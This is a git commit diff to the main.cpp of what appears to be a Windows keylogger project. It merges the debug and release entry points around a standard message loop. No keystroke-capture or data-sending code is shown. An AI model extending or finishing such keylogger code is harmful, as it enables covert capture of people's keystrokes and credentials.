5ea651be8e319f771c0c88aee07c1b25d7393d36
C1N0 <cinnn0theprogrammer@gmail.com>
2023-11-29 22:34:40 +0200

    Fixed some mistakes.

--- src/keylogger/main.cpp
+++ src/keylogger/main.cpp
@@ -1,26 +1,17 @@
 #include "keylogger.h"
 #include "kqnet.h"
 #include "common.h"
-#include "Windows.h"
+#include <Windows.h>
 
 keylogger transKeys;
 
 #ifdef _DEBUG
 
 int main() {
-
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    return 0;
-}
-
 #else
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-
+#endif
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
@@ -28,5 +19,3 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     return 0;
 }
-
-#endif
